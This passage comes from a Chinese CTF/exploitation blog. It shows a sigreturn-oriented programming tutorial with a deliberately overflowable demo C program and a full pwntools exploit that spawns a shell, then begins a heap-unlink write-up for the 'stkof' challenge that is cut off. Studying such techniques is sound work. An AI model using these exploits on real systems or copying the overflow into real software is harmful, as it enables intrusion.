rsi = 0x8402010,</span><br><span class="line">  rbp = 0x7ffffffee250,</span><br><span class="line">  rbx = 0x0,</span><br><span class="line">  rdx = 0x7fffff3fb760,</span><br><span class="line">  rax = 0x14,</span><br><span class="line">  rcx = 0x7fffff3f9b58,</span><br><span class="line">  rsp = 0x7ffffffee250,</span><br><span class="line">  rip = 0x8000785,</span><br><span class="line">  eflags = 0x206,</span><br><span class="line">  cs = 0x33,</span><br><span class="line">  gs = 0x2b,</span><br><span class="line">  fs = 0x53,</span><br><span class="line">  __pad0 = 0x0,</span><br><span class="line">  err = 0x0,</span><br><span class="line">  trapno = 0x0,</span><br><span class="line">  oldmask = 0x0,</span><br><span class="line">  cr2 = 0x0,</span><br><span class="line">  &#123;</span><br><span class="line">    fpstate = 0x0,</span><br><span class="line">    __fpstate_word = 0x0</span><br><span class="line">  &#125;,</span><br><span class="line">  __reserved1 = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的寄存器值与当前上下文稍有出入，是因为调用 handler_signal() 函数传参等修改寄存器所致。</p>
<p>还可以观察 ucontext-&gt;uc_mcontext-&gt;greps 字段，这个也会与 sigcontext 结构体数据一致。也就是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; p (<span class="keyword">struct</span> ucontext)*<span class="number">0x00007ffffffedbb8</span></span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; b *0x8000763</span><br><span class="line">gef&gt; c</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────[ registers ]────</span><br><span class="line">$rax   : 0x13</span><br><span class="line">$rbx   : 0x0</span><br><span class="line">$rcx   : 0x7fffffed</span><br><span class="line">$rdx   : 0x7fffff3fb760      →  0x0000000000000000</span><br><span class="line">$rsp   : 0x7ffffffedbb8      →  0x00007fffff093060  →  &lt;__restore_rt+0&gt; mov rax, 0xf</span><br><span class="line">$rbp   : 0x7ffffffee250      →  0x0000000008000790  →  &lt;__libc_csu_init+0&gt; push r15</span><br><span class="line">$rsi   : 0x8402010           →  "handling signal: 2"</span><br><span class="line">$rdi   : 0x0</span><br><span class="line">$rip   : 0x8000763           →  &lt;handle_signal+35&gt; ret</span><br><span class="line">$r8    : 0x1</span><br><span class="line">$r9    : 0x13</span><br><span class="line">$r10   : 0x64</span><br><span class="line">$r11   : 0x64</span><br><span class="line">$r12   : 0x8000610           →  &lt;_start+0&gt; xor ebp, ebp</span><br><span class="line">$r13   : 0x7ffffffee330      →  0x0000000000000001</span><br><span class="line">$r14   : 0x0</span><br><span class="line">$r15   : 0x0</span><br><span class="line">$eflags: [carry parity adjust zero sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$ds: 0x0000  $es: 0x0000  $cs: 0x0033  $fs: 0x0000  $ss: 0x002b  $gs: 0x0000</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">0x00007ffffffedbb8│+0x00: 0x00007fffff093060  →  &lt;__restore_rt+0&gt; mov rax, 0xf  ← $rsp</span><br><span class="line">0x00007ffffffedbc0│+0x08: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbc8│+0x10: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbd0│+0x18: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbd8│+0x20: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbe0│+0x28: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbe8│+0x30: 0x0000000008402000  →  0x0000000000000000</span><br><span class="line">0x00007ffffffedbf0│+0x38: 0x0000000000000000</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────[ code:i386:x86-64 ]────</span><br><span class="line">    0x800075c &lt;handle_signal+28&gt; call   0x80005e0 &lt;printf@plt&gt;</span><br><span class="line">    0x8000761 &lt;handle_signal+33&gt; nop</span><br><span class="line">    0x8000762 &lt;handle_signal+34&gt; leave</span><br><span class="line"> →  0x8000763 &lt;handle_signal+35&gt; ret</span><br><span class="line">   ↳  0x7fffff093060 &lt;__restore_rt+0&gt; mov    rax, 0xf</span><br><span class="line">      0x7fffff093067 &lt;__restore_rt+7&gt; syscall</span><br><span class="line">      0x7fffff093069 &lt;__restore_rt+9&gt; nop    DWORD PTR [rax+0x0]</span><br><span class="line">      0x7fffff093070 &lt;__libc_sigaction+0&gt; sub    rsp, 0xd0</span><br><span class="line">      0x7fffff093077 &lt;__libc_sigaction+7&gt; test   rsi, rsi</span><br><span class="line">      0x7fffff09307a &lt;__libc_sigaction+10&gt; mov    r8, rdx</span><br><span class="line">─────────────────────────────────────────────────────────────────────────[ source:./debug_sig.c+11 ]────</span><br><span class="line">      6  #include &lt;signal.h&gt;</span><br><span class="line">      7</span><br><span class="line">      8  void handle_signal(int signum)</span><br><span class="line">      9  &#123;</span><br><span class="line">     10  printf("handling signal: %d\n", signum);</span><br><span class="line"> →   11         &#125;</span><br><span class="line">     12</span><br><span class="line">     13  int main()&#123;</span><br><span class="line">     14      signal(SIGINT, (void *)handle_signal);</span><br><span class="line">     15      printf("catch me if you can\n");</span><br><span class="line">     16      while(1) &#123;&#125;</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────[ threads ]────</span><br><span class="line">[#0] Id 1, Name: "debug_sig", stopped, reason: BREAKPOINT</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────[ trace ]────</span><br><span class="line">[#0] 0x8000763 → Name: handle_signal(signum=0x2)</span><br><span class="line">[#1] 0x7fffff093060 → Name: __restore_rt()</span><br><span class="line">[#2] 0x8000785 → Name: main()</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"></span><br><span class="line">Breakpoint 4, 0x0000000008000763 in handle_signal (signum=0x2) at ./debug_sig.c:11</span><br><span class="line">11      &#125;</span><br></pre></td></tr></table></figure>
<p>可以看到信号处理函数返回时，调用 __restore_rt() ，也就是在调用 0xf 号系统调用( sigreturn )。</p>
<h1><span id="syscall-相关">syscall 相关</span></h1><p>主要在于寻找相关的 gadgets 和系统调用参数的传递及返回值</p>
<p>调用号通过 rax 传递</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rax,<span class="number">0xf</span></span><br><span class="line">ret</span><br><span class="line">...</span><br><span class="line">syscall</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>syscall 调用成功后返回调用号，系统调用失败后值存入 rax，系统调用失败值参阅：<a href="http://www-numi.fnal.gov/offline_software/srt_public_context/WebDocs/Errors/unix_system_errors.html" target="_blank" rel="external">http://www-numi.fnal.gov/offline_software/srt_public_context/WebDocs/Errors/unix_system_errors.html</a></p>
<p>以 x64 为例，系统调用号可查阅 inclde/generated/asm-offsets.h:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#define __NR_syscall_max 322</span><br><span class="line"></span><br><span class="line">#ifndef _ASM_X86_UNISTD_64_H</span><br><span class="line">#define _ASM_X86_UNISTD_64_H 1</span><br><span class="line"></span><br><span class="line">#define __NR_read 0</span><br><span class="line">#define __NR_write 1</span><br><span class="line">#define __NR_open 2</span><br><span class="line">#define __NR_close 3</span><br><span class="line">#define __NR_stat 4</span><br><span class="line">#define __NR_fstat 5</span><br><span class="line">#define __NR_lstat 6</span><br><span class="line">#define __NR_poll 7</span><br><span class="line">#define __NR_lseek 8</span><br><span class="line">#define __NR_mmap 9</span><br><span class="line">#define __NR_mprotect 10</span><br><span class="line">#define __NR_munmap 11</span><br><span class="line">...</span><br><span class="line">#define __NR_fork 57</span><br><span class="line">#define __NR_vfork 58</span><br><span class="line">#define __NR_execve 59</span><br><span class="line">#define __NR_exit 60</span><br><span class="line">#define __NR_wait4 61</span><br><span class="line">#define __NR_kill 62</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h1><span id="x64simple-demo">x64simple demo</span></h1><p>要点：</p>
<ul>
<li>利用 pwntools srop 可快速构造 fake signal frame</li>
<li>精心布局栈空间，完成 sigreturn 的 rop 后紧跟 fake signal frame</li>
</ul>
<p>示例代码如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">* just for srop simple:https://0x00sec.org/t/srop-signals-you-say/2890</span><br><span class="line">* gcc -o x64simple ./x64simple.c -g -no-pie -z execstack</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void syscall_()&#123;</span><br><span class="line">    __asm__("syscall; ret;");</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void set_rax()&#123;</span><br><span class="line">    __asm__("movl $0xf, %eax; ret;");</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    // ONLY SROP!</span><br><span class="line">    char buff[100];</span><br><span class="line">    printf("Buff @%p, can you SROP?\n", buff);</span><br><span class="line">    read(0, buff, 5000);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ checksec ./x64simple</span><br><span class="line">[*] './x64simple'</span><br><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></p>
<p>这里为什么把保护全关呢。因为起初的利用思路是调用 mprotect 系统调用对栈内存属性改写，实现栈缓冲区可执行</p>
<p>然而在实践的过程问题却发现行不通：在 NX 的条件下，对栈缓冲区内存改写属性会失败。</p>
<h2><span id="1定位崩溃点">1.定位崩溃点</span></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[ Legend: Modified <span class="keyword">register</span> | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────</span><br><span class="line">$rax   : <span class="number">0x0</span></span><br><span class="line">$rbx   : <span class="number">0x0</span></span><br><span class="line">$rcx   : <span class="number">0x37b</span></span><br><span class="line">$rdx   : <span class="number">0x1f4</span></span><br><span class="line">$rsp   : <span class="number">0x7ffffffee238</span>      -&gt;  <span class="string">"paaaaaaaqa"</span></span><br><span class="line">$rbp   : <span class="number">0x616161616161616f</span> (<span class="string">"oaaaaaaa"</span>?)</span><br><span class="line">$rsi   : <span class="number">0x7ffffffee1c0</span>      -&gt;  <span class="string">"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"</span></span><br><span class="line">$rdi   : <span class="number">0x0</span></span><br><span class="line">$rip   : <span class="number">0x400599</span>            -&gt;  &lt;main+<span class="number">60</span>&gt; ret</span><br><span class="line">$r8    : <span class="number">0x1</span></span><br><span class="line">$r9    : <span class="number">0x24</span></span><br><span class="line">$r10   : <span class="number">0x37b</span></span><br><span class="line">$r11   : <span class="number">0x37b</span></span><br><span class="line">$r12   : <span class="number">0x400450</span>            -&gt;  &lt;_start+<span class="number">0</span>&gt; xor ebp, ebp</span><br><span class="line">$r13   : <span class="number">0x7ffffffee310</span>      -&gt;  <span class="number">0x0000000000000001</span></span><br><span class="line">$r14   : <span class="number">0x0</span></span><br><span class="line">$r15   : <span class="number">0x0</span></span><br><span class="line">$eflags: [CARRY PARITY adjust zero sign trap INTERRUPT direction overflow RESUME virtualx86 identification]</span><br><span class="line">$fs: <span class="number">0x0000</span>  $gs: <span class="number">0x0000</span>  $ss: <span class="number">0x002b</span>  $es: <span class="number">0x0000</span>  $ds: <span class="number">0x0000</span>  $cs: <span class="number">0x0033</span></span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────[ <span class="built_in">stack</span> ]────</span><br><span class="line"><span class="number">0x00007ffffffee238</span>|+<span class="number">0x00</span>: <span class="string">"paaaaaaaqa"</span>   &lt;- $rsp</span><br><span class="line"><span class="number">0x00007ffffffee240</span>|+<span class="number">0x08</span>: <span class="number">0x00000000000a6171</span> (<span class="string">"qa"</span>?)</span><br><span class="line"><span class="number">0x00007ffffffee248</span>|+<span class="number">0x10</span>: <span class="number">0x00007ffffffee318</span>  -&gt;  <span class="number">0x00007ffffffee51f</span>  -&gt;  <span class="string">"./x64simple[...]"</span></span><br><span class="line"><span class="number">0x00007ffffffee250</span>|+<span class="number">0x18</span>: <span class="number">0x00000001ff1c12c8</span></span><br><span class="line"><span class="number">0x00007ffffffee258</span>|+<span class="number">0x20</span>: <span class="number">0x000000000040055d</span>  -&gt;  &lt;main+<span class="number">0</span>&gt; push rbp</span><br><span class="line"><span class="number">0x00007ffffffee260</span>|+<span class="number">0x28</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007ffffffee268</span>|+<span class="number">0x30</span>: <span class="number">0xec7013cae5dbabc5</span></span><br><span class="line"><span class="number">0x00007ffffffee270</span>|+<span class="number">0x38</span>: <span class="number">0x0000000000400450</span>  -&gt;  &lt;_start+<span class="number">0</span>&gt; xor ebp, ebp</span><br></pre></td></tr></table></figure>
<p>通过 gdb 调试，rsp - rsi 得到 padding size == 120</p>
<h2><span id="2-寻找-gadgets">2. 寻找 gadgets</span></h2><p>利用ropper可搜寻到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syscall_addr = <span class="number">0x40054a</span></span><br><span class="line">mov_eax_15_ret = <span class="number">0x400554</span></span><br></pre></td></tr></table></figure>
<h2><span id="3fake-signal-frame">3.fake signal frame</span></h2><p>调用 execve 系统调用，可直接使用 pwntools 中的 srop 框架<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line"><span class="comment"># execve syscall number == 59</span></span><br><span class="line">frame.rax = <span class="number">59</span> <span class="comment"># execve syscall number</span></span><br><span class="line">frame.rdi = buff_addr</span><br><span class="line">frame.rsi = <span class="number">0</span> </span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line"><span class="comment"># signal frame size == 248</span></span><br><span class="line">frame.rsp = buff_addr + len(payload) + <span class="number">248</span></span><br><span class="line"><span class="comment"># SET RIP TO SYSCALL ADDRESS</span></span><br><span class="line">frame.rip = syscall_ret</span><br></pre></td></tr></table></figure></p>
<h2><span id="4完整-exp-及-getshell">4.完整 exp 及 getshell</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-* coding:utf-8 *-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from Frame import SigreturnFrame</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"><span class="comment"># context.log_level = "DEBUG"</span></span><br><span class="line"></span><br><span class="line">mov_eax_15_ret = <span class="number">0x400554</span></span><br><span class="line">syscall_ret = <span class="number">0x40054a</span></span><br><span class="line">main_addr = <span class="number">0x400565</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./x64simple"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.leak buffer addr</span></span><br><span class="line">p.recvuntil(<span class="string">"Buff @0x"</span>)</span><br><span class="line">buff_addr = int(p.recvuntil(<span class="string">","</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"buff addr:"</span>,hex(buff_addr)</span><br><span class="line">p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">binsh = <span class="string">"/bin/sh\x00"</span></span><br><span class="line"></span><br><span class="line">payload = binsh + (<span class="number">120</span>-len(binsh))*<span class="string">'\x90'</span></span><br><span class="line"><span class="comment"># why? sigreturn syscall number is 15,syscall arg by eax passed</span></span><br><span class="line">payload += p64(mov_eax_15_ret) + p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame() <span class="comment"># CREATING A SIGRETURN FRAME</span></span><br><span class="line">frame.rax = <span class="number">59</span></span><br><span class="line">frame.rdi = buff_addr</span><br><span class="line">frame.rsi = <span class="number">0</span> </span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rsp = buff_addr + len(payload) + <span class="number">248</span> <span class="comment"># WHERE 248 IS SIZE OF FAKE FRAME!</span></span><br><span class="line">frame.rip = syscall_ret <span class="comment"># SET RIP TO SYSCALL ADDRESS</span></span><br><span class="line"><span class="comment"># PLACE FAKE FRAME ON STACK</span></span><br><span class="line"><span class="comment"># payload += p64(main_addr) + str(frame)</span></span><br><span class="line">payload += str(frame)</span><br><span class="line">payload += p64(main_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># wait for debuger</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">$python ./pwn_x64simple.py </span><br><span class="line">[+] Starting local process <span class="string">'./x64simple'</span>: pid <span class="number">13214</span></span><br><span class="line">buff addr: <span class="number">0x7ffeb5211770</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">asan</span><br></pre></td></tr></table></figure>
<h1><span id="reference">Reference</span></h1><ul>
<li>sides:<a href="https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf" target="_blank" rel="external">https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf</a></li>
<li>paper:<a href="http://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf" target="_blank" rel="external">http://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf</a></li>
<li><a href="http://www.freebuf.com/articles/network/87447.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/87447.html</a></li>
<li>示例：<a href="https://0x00sec.org/t/srop-signals-you-say/2890" target="_blank" rel="external">https://0x00sec.org/t/srop-signals-you-say/2890</a></li>
<li><a href="https://elixir.bootlin.com/linux/v4.6/source/arch/x86/include/uapi/asm/sigcontext.h" target="_blank" rel="external">https://elixir.bootlin.com/linux/v4.6/source/arch/x86/include/uapi/asm/sigcontext.h</a></li>
<li><a href="http://www-numi.fnal.gov/offline_software/srt_public_context/WebDocs/Errors/unix_system_errors.html" target="_blank" rel="external">http://www-numi.fnal.gov/offline_software/srt_public_context/WebDocs/Errors/unix_system_errors.html</a></li>
</ul>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/10/21/stkof_detail/" itemprop="url">
                  stkof heap unlink 实战详解
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2018-10-21T14:00:00+08:00" content="2018-10-21">
              2018-10-21
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/heap/" itemprop="url" rel="index">
                    <span itemprop="name">heap</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
                &nbsp; | &nbsp;
                <a href="/2018/10/21/stkof_detail/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/10/21/stkof_detail/" itemprop="commentsCount"></span>
                </a>
              </span>
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>实验环境：</p>
<ul>
<li>pwntools:3.12.1</li>
<li>wsl debian</li>
<li>libc:2.24</li>
<li>gdb+gef,IDA</li>
</ul>
<p>checksec:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec ./stkof</span><br><span class="line">[*] './stkof'</span><br><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p>
<p>breakpoints:</p>
<ul>
<li>main ep:0x400c58</li>
<li>获取四个函数的输入值: b *0x400d16</li>
</ul>
<h1><span id="patch-alarm">patch alarm()</span></h1><p>调试时第一坑就是 alarm() 运行时间警告，</p>
<p>0x400c6f-0x40078</p>
<p>使用 keypatch patch 掉就可以。</p>
<h1><span id="程序的四个主功能">程序的四个主功能</span></h1><p>IDA F5 查看对照着汇编代码总算找到了点眉目。首先程序运行开始 while 循环</p>
<p>要求输入，根据输入值调用不同function，输入值为 1~4，如果输入为其他值会提示”FAIL”</p>
<p>这个时候会申请一段内存，0x210，0xe05010，存储输入的值</p>
<p>结合 objdump -R ./stkof 查看重定位表，可摸索出这四个 function 的逻辑</p>
<ul>
<li>0x400cac Malloc_1，将输入的值作为大小然后分配内存，然后 print 当前分配的堆序号 换行 “OK”</li>
<li>0x400cbb Fread_2，第一次获取输入的堆块序号，判断是否在堆里，第二次获取输入的大小，第三次获取输入的值然后写入对应序号的堆内存里，输出 “OK” 换行</li>
<li>0x400cca Free_3，获取堆序号输入，free 堆序号对应的堆内存</li>
<li>0x400cd9 Fgets_strlen_put</li>
</ul>
<p>执行成功输出 “OK”，这个时候也会申请一段内存，0x210，0xe05280，存储 “OK” 值，继续 while 循环</p>
<ul>
<li>.bss addr: 0x6020c0 </li>
<li>.got.plt: 0x60200</li>
<li>存储申请的堆地址：0x6020c0+0x88,0x602148</li>
</ul>
<h1><span id="利用思路">利用思路</span></h1><ol>
<li>连续申请三次堆，这样第二个和第三个堆内存物理相连</li>
<li>覆写2号堆，伪造 chunk</li>
<li>free 3 号堆,bypass unlink</li>
<li>编辑 2 号堆覆写 free got 内容为 puts plt，leak function addr</li>
<li>计算得到 system() addr</li>
<li>接下来有两种思路可getshell:</li>
</ol>
<ul>
<li>再次覆写 free got 为 system addr,然后申请一个堆，写入”/bin/sh”, 再 free 掉这个堆即可实现 getshell</li>
<li>覆写 atoi got 为 system addr,这样程序在陷入获取功能序号的时候，输入 ‘/bin/sh’,调用 atoi 转换也可实现 getshell</li>
</ul>
<h1><span id="getshell-脚本及执行过程">getshell 脚本及执行过程</span></h1><p>这里采用第一种覆写 free got 的方式 getshell，因为比较稳<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 